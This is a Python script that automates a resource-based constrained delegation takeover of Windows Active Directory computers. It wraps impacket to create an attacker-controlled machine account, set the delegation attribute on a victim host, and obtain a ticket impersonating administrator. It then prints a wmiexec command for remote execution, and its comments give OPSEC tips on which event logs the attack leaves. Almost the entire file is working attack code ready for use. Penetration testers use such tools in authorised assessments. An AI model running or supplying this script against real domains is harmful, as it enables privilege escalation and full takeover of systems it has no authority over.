#!/usr/bin/env python3
"""
rbcd_takeover.py - Resource-Based Constrained Delegation takeover orchestrator.

Automates the 3-step RBCD attack when you hold GenericWrite/GenericAll over a target
computer and MachineAccountQuota > 0:
  1. addcomputer   -> create an attacker-controlled machine account
  2. rbcd write    -> set msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$
  3. getST (S4U)   -> impersonate a privileged user to TARGET's SPN, save .ccache
Includes a --cleanup mode that flushes the RBCD attribute and deletes the machine account.

Usage:
    python3 rbcd_takeover.py -d corp.local --dc-ip 10.0.0.10 -u user -p 'Pass' \
        --target 'WS01$' --spn cifs/ws01.corp.local --impersonate administrator
    python3 rbcd_takeover.py -d corp.local --dc-ip 10.0.0.10 -u user -p 'Pass' \
        --target 'WS01$' --evil 'EVIL$' --evil-pass 'Evil123!' --cleanup

Dependencies:
    pip install impacket   # addcomputer.py / rbcd.py / getST.py on PATH
Notes:
    - Wraps impacket binaries; falls back between 'foo.py' and 'impacket-foo' names.
    - getST writes <impersonate>@<spn>@<DOMAIN>.ccache; export KRB5CCNAME to use it.
    - OPSEC: creating EVIL$ logs 4741; RBCD write logs 5136. Run --cleanup after.
"""
import argparse
import shutil
import subprocess
import sys


def tool(name):
    for cand in (f"{name}.py", f"impacket-{name}"):
        if shutil.which(cand):
            return cand
    sys.exit(f"[-] {name} not found (install impacket)")


def authspec(args):
    target = f"{args.domain}/{args.username}"
    extra = []
    if args.hashes:
        extra = ["-hashes", args.hashes if ":" in args.hashes else f":{args.hashes}"]
    else:
        target += f":{args.password}"
    return target, extra


def run(cmd):
    print(f"[>] {' '.join(cmd)}")
    return subprocess.run(cmd, check=False).returncode


def main():
    ap = argparse.ArgumentParser(description="RBCD takeover orchestrator")
    ap.add_argument("-d", "--domain", required=True)
    ap.add_argument("--dc-ip", required=True)
    ap.add_argument("-u", "--username", required=True)
    ap.add_argument("-p", "--password", default="")
    ap.add_argument("-H", "--hashes", help="[LM]:NT of the GenericWrite principal")
    ap.add_argument("--target", required=True, help="victim computer, e.g. 'WS01$'")
    ap.add_argument("--evil", default="EVIL$", help="machine account to create")
    ap.add_argument("--evil-pass", default="Evil123!")
    ap.add_argument("--spn", help="service SPN to impersonate to, e.g. cifs/ws01.corp.local")
    ap.add_argument("--impersonate", default="administrator")
    ap.add_argument("--cleanup", action="store_true",
                    help="flush RBCD attr + delete EVIL$ and exit")
    args = ap.parse_args()

    target_spec, extra = authspec(args)
    dc = ["-dc-ip", args.dc_ip]

    if args.cleanup:
        run([tool("rbcd"), "-delegate-to", args.target, "-action", "flush"] + dc
            + extra + [target_spec])
        run([tool("addcomputer"), "-computer-name", args.evil, "-delete"] + dc
            + extra + [target_spec])
        print("[+] Cleanup done (RBCD flushed, machine account removed).")
        return

    # 1. Create attacker machine account
    if run([tool("addcomputer"), "-computer-name", args.evil,
            "-computer-pass", args.evil_pass] + dc + extra + [target_spec]) != 0:
        print("[!] addcomputer failed (MachineAccountQuota=0?). "
              "Reuse an existing controlled machine account via --evil/--evil-pass.")

    # 2. Write RBCD on the target
    run([tool("rbcd"), "-delegate-from", args.evil, "-delegate-to", args.target,
         "-action", "write"] + dc + extra + [target_spec])

    # 3. S4U: impersonate to the target's SPN
    if not args.spn:
        print("[*] No --spn given; supply one to run S4U. "
              "RBCD is set. Example follow-up:")
        print(f"    getST -spn cifs/<host> -impersonate {args.impersonate} -dc-ip "
              f"{args.dc_ip} {args.domain}/{args.evil}:{args.evil_pass}")
        return
    run([tool("getST"), "-spn", args.spn, "-impersonate", args.impersonate]
        + dc + [f"{args.domain}/{args.evil}:{args.evil_pass}"])
    ccache = f"{args.impersonate}@{args.spn.replace('/', '_')}@{args.domain.upper()}.ccache"
    print(f"[+] Ticket saved. Use it:\n    export KRB5CCNAME={ccache}\n"
          f"    impacket-wmiexec -k -no-pass {args.spn.split('/')[1]}")
    print("[i] Run again with --cleanup when finished.")


if __name__ == "__main__":
    main()
